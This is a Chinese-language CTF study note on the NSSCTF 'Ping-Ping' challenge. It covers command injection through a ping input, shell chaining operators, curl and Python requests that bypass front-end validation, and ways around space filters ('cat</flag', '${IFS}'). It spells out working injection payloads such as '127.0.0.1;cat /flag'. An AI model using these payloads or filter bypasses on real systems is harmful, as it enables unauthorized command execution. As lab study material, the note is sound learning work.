# Web笔记05-发请求的几种方式 + 命令注入重点复盘

> 来源：NSSCTF 3873 Ping-Ping 做题后的三问三答 ｜ 日期：2026-08-01

---

## 重点1：怎么从"只有一个入口"猜到 RCE

- 全站只有**一个输入点**（ping 输入框）→ 攻击面分析：突破口必然在这
- 观察行为推断后端（黑盒推断）：POST 参数 `command`、响应带 `X-Powered-By: PHP`、输出恰好 6 个 ping 包 → 大概率是 `shell_exec('ping -c 6 ' . $input)`
- 用 `;` 拼接第二条命令验证 → 出文件列表 → RCE 实锤

### ⚠️ 重要修正：`;` 不是 PHP 语法，是 shell（Linux）语法

- PHP 只负责**拼字符串**：`'ping -c 6 ' . $command`
- 真正拆解 `;` 并执行两条命令的是 **shell**（Linux 的命令解释器）
- 链条：用户输入 → PHP 拼接 → 交给 shell → shell 按自己的语法解析执行
- 所以判断标准是**命令最终交给谁解释**，而不是"用了什么语言写的网站"

### 常用拼接符速查（shell 语法）

| 写法 | 含义 | ping 成功时 | ping 失败时 |
|---|---|---|---|
| `A ; B` | 不管结果都执行 B | ✅ | ✅ |
| `A && B` | A 成功才执行 B | ✅ | ❌ |
| `A \|\| B` | A 失败才执行 B | ❌ | ✅ |
| `A \| B` | A 的输出喂给 B | 视命令而定 | 视命令而定 |

> 实测：`127.0.0.1 || cat /flag` 在本靶机**不出 flag**（ping 必然成功，`||` 永不触发）；
> `;` 和 `&&` 都出。参考解答里的 payload 未必适用于每一题，**必须实测**。

---

## 重点2：绕过前端校验用 curl，以及图形化工具

### 为什么 curl 能绕过前端校验

- 前端 JS（`check_ip()`）只在**浏览器里跑**，管的是"手工填写的人"
- curl 直接构造 HTTP 报文，不经过浏览器，不执行 JS → 前端校验形同虚设
- 规律：**前端校验 = 用户体验，不是安全防线；真正的防线在后端**

### curl 速查表

```bash
curl.exe 网址                              # GET 请求
curl.exe -X POST 网址                      # 指定 POST
curl.exe -X POST 网址 -d "key=value"       # 提交表单数据（不转义）
curl.exe -X POST 网址 --data-urlencode "key=value"  # 提交数据（自动转义，带符号用它）
curl.exe -s 网址                           # 静默：去掉进度条
curl.exe -i 网址                           # 显示响应头（看 Server/PHP 版本）
curl.exe -o 文件 网址                      # 响应存文件
curl.exe -v 网址                           # 调试：看完整请求响应
curl.exe -G 网址 --data-urlencode "k=v"    # 把数据变成 GET 参数放进 URL
curl.exe -A "UA字符串" 网址                # 伪装浏览器 UA
curl.exe -H "Header名: 值" 网址            # 自定义请求头
```

### GET 参数 vs POST 参数（两者可同时发）

| 位置 | 写法 | 服务器读取 |
|---|---|---|
| URL 里 | `curl "http://x/?get1=a&get2=b"` | `$_GET['get1']` |
| body 里 | `-d "post1=c&post2=d"` | `$_POST['post1']` |
| 同时 | `curl -X POST "http://x/?get=a" -d "post=b"` | 两边都能取到 |

> 实测：把 `command` 放 URL（GET）发给本靶机 → 空响应，因为后端只读 `$_POST['command']` → **参数位置错 = 请求白发**

### curl 图形化替代工具（本质相同，都是构造 HTTP 请求）

| 工具 | 类型 | 适合 | 备注 |
|---|---|---|---|
| F12 Network 面板 | 浏览器自带 | 看请求、复制为 curl | 只能看浏览器自己发的 |
| HackBar | 浏览器插件 | 快速改 GET/POST 重发 | 轻量，入门推荐 |
| Burp Suite | 专业代理 | 拦截、改包、重放、爆破 | 进阶必学，抓包神器 |
| Postman / Apifox | 接口调试 | 调试开发接口 | 偏开发，CTF 用得少 |

> 图形化工具 ≠ 不用学 curl：**写脚本、自动化、盲注循环时只能靠 curl / Python**。

---

## 重点3：发请求到底有哪几种方式（全景）

### 核心认知：所有方式底层是同一件事——发 HTTP 报文

```
浏览器表单 / curl / Python requests / Burp / HackBar
        │
        ▼ 本质都是构造同一个东西：
        │
        POST / HTTP/1.1                      ← 请求行（方式+路径）
        Host: node5.anna.nssctf.cn:21330     ← 请求头
        Content-Type: application/x-www-form-urlencoded
        │
        command=127.0.0.1;cat /flag          ← 请求体
```

区别只在于**谁来帮你构造这个报文**：

| 方式 | 能不能跑 JS | 能不能改报文 | 适不适合自动化 | 适合场景 |
|---|---|---|---|---|
| 浏览器表单 | ✅（会拦你） | ❌ | ❌ | 正常用户操作 |
| F12 Network | ✅（跟随浏览器） | 有限 | ❌ | 观察请求长啥样 |
| curl | ❌ | ✅ 任意 | ✅ 脚本循环 | CTF 打题主力 |
| Python requests | ❌ | ✅ 任意 | ✅✅ 最强 | 盲注/爆破/自动化 |
| Burp / HackBar | ❌ | ✅✅ 拦截修改 | 部分 | 调试、重放、爆破 |

### Python 版（和 curl 完全等价，供对比）

```python
import requests
r = requests.post("http://node5.anna.nssctf.cn:21330/",
                  data={"command": "127.0.0.1;cat /flag"})
print(r.text)   # 同样的响应
```

> curl 和 Python 选哪个？—— 一次性的手工探测用 curl；要循环、要判断、要写进脚本的用 Python。

---

## 一句话收尾

**做题 = 找入口 → 黑盒推断 → 用你会的任何发请求方式构造报文 → 验证。工具只是构造报文的壳，思想（数据 vs 代码）才是核心。**

---

## 附：无空格执行命令（空格过滤绕过）

> 问：`cat /flag` 之间必须有空格吗？不带空格行不行？

### 为什么必须空格

- shell 靠 **IFS（分隔符，默认=空格）** 把一句话拆成"命令"和"参数"
- `cat /flag` → 拆成 `[cat]` + `[/flag]` → 正常 ✅
- `cat/flag` → 拆成 `[cat/flag]` 一个整体 → 被当成不存在的命令名 ❌

### 无空格替代方案（WAF 过滤空格时用）

| 写法 | 原理 | 效果 |
|---|---|---|
| `cat</flag` | `<` 输入重定向，把文件内容直接喂给 cat | ✅ 等价 |
| `cat${IFS}/flag` | `${IFS}` 变量默认值就是空格，展开后 = `cat /flag` | ✅ 等价 |
| `cat$IFS/flag` | 不带花括号也行，`/` 会自动截断变量名 | ✅ 等价 |

> 用场景：题目/真实 WAF 把空格替换或删除时，`cat /flag` 被拦，上面写法能绕过。

### 两层编码别混淆（易错点）

```
传输层：command=127.0.0.1;cat+%2Fflag    ← 空格被 URL 编码成 + / %20（防传输歧义）
  ↓ PHP urldecode
shell层：ping -c 6 127.0.0.1;cat /flag   ← 空格还原回来了
  ↓ shell 解析
执行：cat 命令 + /flag 参数
```

- curl 的 `--data-urlencode` 只负责传输层转义
- 空格过滤类 WAF 拦的是 **shell 层**（删掉 payload 里的空格），所以绕法也在 shell 层（`<`、`${IFS}`）

